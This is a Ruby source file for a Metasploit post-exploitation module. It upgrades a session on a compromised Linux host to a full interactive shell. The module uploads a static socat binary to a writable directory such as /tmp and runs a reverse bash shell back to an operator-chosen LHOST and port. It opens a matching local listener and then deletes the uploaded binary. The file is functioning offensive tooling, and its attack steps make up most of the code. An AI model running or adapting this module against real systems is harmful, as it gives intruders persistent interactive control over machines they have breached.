##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Linux Full TTY Shell Using Socat',
      'Description'   => %q{
        This module will upload and execute a reverse Socat based full TTY
        shell. You can use either tcp or udp protocols . The module assumes usage 
        of Kali or another Linux distro running gnome as it will open a new 
        gnome-terminal shell window. It requires socat static-binaries which are 
        included in sn0wfa11's msf repo or you can build your own using andrew-d's 
        static-binary repo linked below in the references.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'sn0wfa11 <jhale85446[at]gmail.com>'
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter'],
      'References'    => 
        [
          [ 'URL', 'https://github.com/sn0wfa11' ],
          [ 'URL', 'https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/' ],
          [ 'URL', 'https://github.com/andrew-d/static-binaries' ]
        ]
    ))

    register_options(
      [
        OptInt.new('TIMEOUT',          [ true, "Timeout on the execute command. (In seconds)", 300]),
        OptString.new('LHOST',         [ true, "Host To Connect To"]),
        OptString.new('LPORT',         [ true, "Host To Connect To", "4444"]),
        OptString.new('WRITEABLE_DIR', [ true, "Writeable directory on target for Socat", "/tmp"]),
        OptString.new('SOCAT_86',      [ true, "Path to Socat x86 binary", "/root/git/msf/binaries/socat86"]),
        OptString.new('SOCAT_64',      [ true, "Path to Socat x64 binary", "/root/git/msf/binaries/socat64"]),
        OptEnum.new('PROTO',           [ true, "The Protocol to use", 'tcp', ['tcp','udp']])
      ], self.class)
  end

  def run
    socat_local
    sleep(1)
    socat_remote
  end

  ###########################################
  # Local Functions
  ###########################################

  def socat_local
    lport = datastore['LPORT']
    proto = datastore['PROTO']
    socat_local = Rex::FileUtils.find_full_path("socat")
    gnome_local = Rex::FileUtils.find_full_path("gnome-terminal")
    bash_local = Rex::FileUtils.find_full_path("bash")

    if !socat_local
      if execute("/usr/bin/arch") =~ /64/
        vprint_status("No local socat, using x64 static binary")
        socat_local = datastore['SOCAT_64']
      else
        vprint_status("No local socat, using x86 static binary")
        socat_local = datastore['SOCAT_86']
      end
    end
    fail_with("No local 'gnome-terminal' found!") if !gnome_local
    fail_with("No local 'bash' found!") if !bash_local 

    cmd = "#{gnome_local} -e '#{bash_local} -c \"#{socat_local} file:`tty`,raw,echo=0 #{proto}-listen:#{lport}; #{bash_local}\"'"
    print_status("Executing the local socat listner")
    return local_execute(cmd)
  end

  def local_execute(cmd)
    begin
      io = ::IO.popen(cmd, "r")
      io.close
      return true
    rescue ::Errno::EACCES, ::Errno::ENOENT
      print_error("Permission denied exec: #{cmd}")
      return false
    end
  end

  ###########################################
  # Remote Functions
  ###########################################

  def socat_remote
    remote_socat = get_remote_path("socat")

    if remote_socat
      print_good("Remote socat found at: #{remote_socat}")
      run_socat(remote_socat)
    else
      if client.sys.config.sysinfo['Architecture'] == ARCH_X64
        socat_bin = datastore['SOCAT_64']
      else
        socat_bin = datastore['SOCAT_86']
      end
      write_dir = datastore['WRITEABLE_DIR']
      socat_target = upload(socat_bin, write_dir)
      fail_with("Upload Unsuccessful") if !socat_target
      execute("chmod +x #{socat_target}")
      run_socat(socat_target)
      sleep(1)
      print_status("Removing Remote Socat")
      rm_f(socat_target)
    end
  end

  def get_remote_path(cmd)
    output = execute("which #{cmd}")
    return nil if !output || output == "" || output =~ /no #{cmd}/
    return output
  end

  def upload(socat_path, write_dir)
    socat_target = "#{write_dir}/#{Rex::Text.rand_text_alpha(8, "")}"
    print_status("Attempting to upload #{socat_path} to #{socat_target} on #{sysinfo['Computer']}...")
    
    begin
      upload_file(socat_target, socat_path)
      if file?(socat_target)
        print_good("Socat uploaded!") 
        return socat_target
      else
        print_error("Unable to upload")
        return nil
      end
    rescue ::Exception => e
      print_error("Error uploading Socat: #{e.class} #{e}")
      print_error(e.to_s)
      return nil
    end
  end

  def run_socat(socat_target)
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    proto = datastore['PROTO']
    bash_remote = get_remote_path("bash")
    fail_with("No remote 'bash' or 'sh' shells found") if !bash_remote

    print_status("Executing Remote Socat")
    cmd = "#{bash_remote} -c \"export TERM=xterm-color; #{socat_target} exec:'#{bash_remote} -li',pty,stderr,setsid,sigint,sane #{proto}:#{lhost}:#{lport} &\""
    execute(cmd)   
  end

  def execute(cmd, time_out = datastore['TIMEOUT'])
    vprint_status("Execute: #{cmd}")
    output = cmd_exec(cmd, nil, time_out)
    vprint_line("#{output}\n")
    return output
  end

end
